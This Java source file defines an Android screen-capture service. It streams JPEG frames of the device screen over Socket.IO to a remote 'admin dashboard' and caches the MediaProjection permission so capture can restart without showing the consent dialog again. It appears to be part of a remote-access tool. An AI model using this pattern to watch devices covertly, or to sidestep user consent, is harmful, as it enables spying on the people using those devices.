package com.fason.app.features.screen;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.Base64;
import android.util.DisplayMetrics;
import android.view.WindowManager;

import com.fason.app.core.FasonApp;
import com.fason.app.core.Protocol;
import com.fason.app.core.network.SocketClient;
import com.fason.app.service.MainService;

import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;

import io.socket.client.Socket;

/**
 * Captures the device screen using MediaProjection API and streams JPEG frames
 * over Socket.IO to the admin dashboard.
 *
 * Features:
 * - Configurable FPS (default 3), quality (default 40%), scale (50%)
 * - Reuses MediaProjection intent on Android 10-13 to avoid repeated dialogs
 * - Auto-cleans up on disconnect or stop command
 */
public final class ScreenCaptureService {

    private static ScreenCaptureService instance;

    private MediaProjection mediaProjection;
    private VirtualDisplay virtualDisplay;
    private ImageReader imageReader;
    private HandlerThread handlerThread;
    private Handler handler;

    private volatile boolean streaming = false;
    private int screenWidth;
    private int screenHeight;
    private int screenDensity;

    // Configurable settings
    private int fps = 3;
    private int quality = 40;
    private float scale = 0.5f;

    // Saved projection intent for reuse (Android 10-13)
    private static int savedResultCode = 0;
    private static Intent savedResultData = null;

    private long lastFrameTime = 0;

    private ScreenCaptureService() {}

    public static synchronized ScreenCaptureService getInstance() {
        if (instance == null) {
            instance = new ScreenCaptureService();
        }
        return instance;
    }

    /**
     * Save MediaProjection permission result for reuse.
     */
    public static void saveProjectionResult(int resultCode, Intent data) {
        savedResultCode = resultCode;
        savedResultData = data != null ? (Intent) data.clone() : null;
    }

    public static boolean hasSavedProjection() {
        return savedResultCode == Activity.RESULT_OK && savedResultData != null;
    }

    /**
     * Start screen capture with a new MediaProjection result.
     */
    public void startCapture(int resultCode, Intent data) {
        if (streaming) return;

        try {
            Context ctx = FasonApp.getContext();
            MediaProjectionManager mpm = (MediaProjectionManager)
                    ctx.getSystemService(Context.MEDIA_PROJECTION_SERVICE);

            if (mpm == null) {
                sendError("MediaProjectionManager not available");
                return;
            }

            // Update foreground service type for media projection
            MainService svc = MainService.getInstance();
            if (svc != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                svc.updateType(android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION);
            }

            mediaProjection = mpm.getMediaProjection(resultCode, data);
            if (mediaProjection == null) {
                sendError("Failed to obtain MediaProjection");
                return;
            }

            mediaProjection.registerCallback(new MediaProjection.Callback() {
                @Override
                public void onStop() {
                    stopCapture();
                }
            }, null);

            // Save for reuse on Android < 14
            if (Build.VERSION.SDK_INT < 34) {
                saveProjectionResult(resultCode, data);
            }

            initCapture(ctx);
        } catch (Exception e) {
            sendError("Start capture failed: " + e.getMessage());
        }
    }

    /**
     * Try to reuse saved projection (Android 10-13 only).
     */
    public boolean tryReuse() {
        if (Build.VERSION.SDK_INT >= 34 || !hasSavedProjection()) {
            return false;
        }

        try {
            Context ctx = FasonApp.getContext();
            MediaProjectionManager mpm = (MediaProjectionManager)
                    ctx.getSystemService(Context.MEDIA_PROJECTION_SERVICE);
            if (mpm == null) return false;

            MainService svc = MainService.getInstance();
            if (svc != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                svc.updateType(android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION);
            }

            mediaProjection = mpm.getMediaProjection(savedResultCode, savedResultData);
            if (mediaProjection == null) {
                savedResultCode = 0;
                savedResultData = null;
                return false;
            }

            mediaProjection.registerCallback(new MediaProjection.Callback() {
                @Override
                public void onStop() {
                    stopCapture();
                }
            }, null);

            initCapture(ctx);
            return true;
        } catch (Exception e) {
            savedResultCode = 0;
            savedResultData = null;
            return false;
        }
    }

    private void initCapture(Context ctx) {
        // Get screen dimensions
        WindowManager wm = (WindowManager) ctx.getSystemService(Context.WINDOW_SERVICE);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            android.view.WindowMetrics wmMetrics = wm.getCurrentWindowMetrics();
            android.graphics.Rect bounds = wmMetrics.getBounds();
            screenWidth = bounds.width();
            screenHeight = bounds.height();
            screenDensity = ctx.getResources().getDisplayMetrics().densityDpi;
        } else {
            DisplayMetrics metrics = new DisplayMetrics();
            wm.getDefaultDisplay().getRealMetrics(metrics);
            screenWidth = metrics.widthPixels;
            screenHeight = metrics.heightPixels;
            screenDensity = metrics.densityDpi;
        }

        int captureWidth = (int) (screenWidth * scale);
        int captureHeight = (int) (screenHeight * scale);

        // Ensure even dimensions (required for some encoders)
        captureWidth = captureWidth & ~1;
        captureHeight = captureHeight & ~1;

        // Create handler thread for image processing
        handlerThread = new HandlerThread("ScreenCapture");
        handlerThread.start();
        handler = new Handler(handlerThread.getLooper());

        // Create ImageReader
        imageReader = ImageReader.newInstance(captureWidth, captureHeight, PixelFormat.RGBA_8888, 2);
        imageReader.setOnImageAvailableListener(this::onImageAvailable, handler);

        // Create virtual display
        virtualDisplay = mediaProjection.createVirtualDisplay(
                "FasonScreen",
                captureWidth, captureHeight, screenDensity,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader.getSurface(),
                null, handler
        );

        streaming = true;
        sendStatus(true);
    }

    private void onImageAvailable(ImageReader reader) {
        if (!streaming) return;

        // Throttle based on FPS
        long now = System.currentTimeMillis();
        long frameInterval = 1000 / fps;
        if (now - lastFrameTime < frameInterval) {
            // Still consume the image to prevent buffer stall
            try {
                Image img = reader.acquireLatestImage();
                if (img != null) img.close();
            } catch (Exception ignored) {}
            return;
        }
        lastFrameTime = now;

        Image image = null;
        try {
            image = reader.acquireLatestImage();
            if (image == null) return;

            Image.Plane[] planes = image.getPlanes();
            ByteBuffer buffer = planes[0].getBuffer();
            int pixelStride = planes[0].getPixelStride();
            int rowStride = planes[0].getRowStride();
            int rowPadding = rowStride - pixelStride * image.getWidth();

            // Create bitmap from image
            Bitmap bitmap = Bitmap.createBitmap(
                    image.getWidth() + rowPadding / pixelStride,
                    image.getHeight(),
                    Bitmap.Config.ARGB_8888
            );
            bitmap.copyPixelsFromBuffer(buffer);

            // Crop to actual size (remove row padding)
            if (bitmap.getWidth() > image.getWidth()) {
                Bitmap cropped = Bitmap.createBitmap(bitmap, 0, 0, image.getWidth(), image.getHeight());
                bitmap.recycle();
                bitmap = cropped;
            }

            // Compress to JPEG
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            bitmap.compress(Bitmap.CompressFormat.JPEG, quality, baos);
            bitmap.recycle();

            byte[] jpegData = baos.toByteArray();
            String base64Frame = Base64.encodeToString(jpegData, Base64.NO_WRAP);

            // Send frame via socket
            Socket socket = SocketClient.getInstance().getSocket();
            if (socket != null && socket.connected()) {
                JSONObject frameObj = new JSONObject();
                frameObj.put(Protocol.KEY_TYPE, Protocol.KEY_FRAME);
                frameObj.put(Protocol.KEY_FRAME, base64Frame);
                frameObj.put(Protocol.KEY_SCREEN_W, screenWidth);
                frameObj.put(Protocol.KEY_SCREEN_H, screenHeight);
                socket.emit(Protocol.SCREEN, frameObj);
            } else {
                stopCapture();
            }
        } catch (Exception ignored) {
        } finally {
            if (image != null) {
                try { image.close(); } catch (Exception ignored) {}
            }
        }
    }

    public void stopCapture() {
        streaming = false;

        try {
            if (virtualDisplay != null) {
                virtualDisplay.release();
                virtualDisplay = null;
            }
        } catch (Exception ignored) {}

        try {
            if (imageReader != null) {
                imageReader.close();
                imageReader = null;
            }
        } catch (Exception ignored) {}

        try {
            if (mediaProjection != null) {
                mediaProjection.stop();
                mediaProjection = null;
            }
        } catch (Exception ignored) {}

        try {
            if (handlerThread != null) {
                handlerThread.quitSafely();
                handlerThread = null;
                handler = null;
            }
        } catch (Exception ignored) {}

        // Release media projection foreground service type
        MainService svc = MainService.getInstance();
        if (svc != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            svc.releaseType(android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION);
        }

        sendStatus(false);
    }

    public void setFps(int fps) {
        this.fps = Math.max(1, Math.min(10, fps));
    }

    public void setQuality(int quality) {
        this.quality = Math.max(10, Math.min(100, quality));
    }

    public void setScale(float scale) {
        this.scale = Math.max(0.25f, Math.min(1.0f, scale));
    }

    public boolean isStreaming() {
        return streaming;
    }

    public int getScreenWidth() { return screenWidth; }
    public int getScreenHeight() { return screenHeight; }

    private void sendStatus(boolean streaming) {
        try {
            Socket socket = SocketClient.getInstance().getSocket();
            if (socket != null) {
                JSONObject status = new JSONObject();
                status.put(Protocol.KEY_TYPE, Protocol.KEY_STATUS);
                status.put(Protocol.KEY_STREAMING, streaming);
                status.put(Protocol.KEY_SCREEN_W, screenWidth);
                status.put(Protocol.KEY_SCREEN_H, screenHeight);
                status.put(Protocol.KEY_FPS, fps);
                status.put(Protocol.KEY_QUALITY, quality);
                status.put(Protocol.KEY_ACCESSIBLE, ScreenControlService.isEnabled());
                socket.emit(Protocol.SCREEN, status);
            }
        } catch (Exception ignored) {}
    }

    private void sendError(String error) {
        try {
            Socket socket = SocketClient.getInstance().getSocket();
            if (socket != null) {
                JSONObject err = new JSONObject();
                err.put(Protocol.KEY_TYPE, Protocol.KEY_ERROR);
                err.put(Protocol.KEY_ERROR, error);
                socket.emit(Protocol.SCREEN, err);
            }
        } catch (Exception ignored) {}
    }

    public void shutdown() {
        stopCapture();
        instance = null;
    }
}
